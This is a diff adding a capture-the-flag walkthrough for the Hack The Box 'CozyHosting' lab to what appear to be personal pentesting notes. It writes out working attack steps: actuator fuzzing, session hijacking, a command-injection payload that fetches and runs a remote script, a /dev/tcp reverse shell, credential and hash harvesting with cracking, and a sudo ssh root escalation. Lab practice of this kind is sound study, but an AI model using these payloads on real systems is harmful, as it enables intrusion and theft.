@@ -246,6 +246,7 @@ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-ce
 
 
 ## HTB: CozyHosting 02 Mar 2024
+
 ```
 1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.230 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
    nmap -p$ports -sV 10.10.11.230
@@ -254,7 +255,54 @@ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-ce
 	-u Target URL
 	-ic Ignore wordlist comments
 	-t Number of concurrent threads
-3. 
+3. Find page with "Whitelabel Error Page" -> it`s spring boot.
+4. ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
+    (spring boot specific fuzz)
+    	(actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 174ms]
+	actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 174ms]
+	actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 172ms]
+	actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 178ms]
+	actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 185ms]
+	actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 207ms]
+	actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 208ms]
+	actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 233ms]
+	actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 175ms])
+5. http://cozyhosting.htb/actuator/sessions ({"2688CA1A5F14858B58D088D4EDA8F329":"kanderson"})
+6. use the found session key to login http://cozyhosting.htb/admin page.
+7. in "connection settings" put payload in Username field.
+8. attacker machine create reverse shell: echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
+9. attacker machine host file on port 7000: python3 -m http.server 7000 
+10. attacker machine listen: nc -lnvp 4444
+11. put payload in /admin username and run: test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
+
+(in user bash)
+12. get more stable bash: script /dev/null -c bash
+13. cmd: unzip -d /tmp/app cloudhosting-0.0.1.jar
+14. cd /tmp/app; grep -inr "password"; (find pass in file ./BOOT-INF/classes/application.properties:12:)
+15. grep -inr -A3 -B3 "password=Vg&nvzAQ7XxR"
+    (BOOT-INF/classes/application.properties-9-spring.datasource.platform=postgres
+     BOOT-INF/classes/application.properties-10-spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+     BOOT-INF/classes/application.properties-11-spring.datasource.username=postgres
+     BOOT-INF/classes/application.properties:12:spring.datasource.password=Vg&nvzAQ7XxR)
+16. login postgresql: psql -h 127.0.0.1 -U postgres
+
+(in postgres cmd line)
+17. cmd: \list (found interesting database cozyhosting)
+18. cmd: \connect cozyhosting
+19. cmd: \dt  (show 2 tables "hosts" and "users")
+20. cmd: select * from users;
+     (kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim)
+     (admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm)
+21. Identify the hash type: hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
+22. crack passwd:
+    hashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt (manchesterunited)
+23. cat /etc/passwd (found user josh)
+
+(login as josh)
+24. ssh josh@{ip} with found password "manchesterunited"
+25. sudo -l found ssh
+26. https://gtfobins.github.io/gtfobins/ssh/#shell found exploit
+27. exploit: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
 
